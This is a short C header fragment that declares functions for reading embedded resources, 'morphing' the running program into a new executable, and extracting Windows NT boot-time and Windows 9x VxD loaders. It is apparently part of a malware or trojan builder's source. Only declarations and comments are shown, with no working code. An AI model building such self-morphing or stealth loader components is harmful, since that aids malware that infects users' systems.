extern void* SM_GetResource( int ResType, int ResId,
                                      DWORD* ResourceSize );
/*
  Get pointer to the resource data (also returns resource size)
  attached to the currently executing image. This means, if
  image was loaded by smloader, it does not uses api functions
*/

extern BOOL SM_MorphServer( HANDLE Fh, DWORD ResId, char* FNames,
                            BYTE* Cfg, DWORD CfgSz );
/*
  Morphs itself into new file;
  Fh is the handle of destination file
  FNames, Cfg are set in resources in dest exe file
*/

extern BOOL SM_ExtractBootexec( char* FileName, char* SrvName, DWORD ResId );
/*
  Morphs WNT loader into new file
*/

extern BOOL SM_ExtractVxD( char* FileName, char* ServerName, DWORD ResId );
/*
  Morphs W9X loader into new file
*/
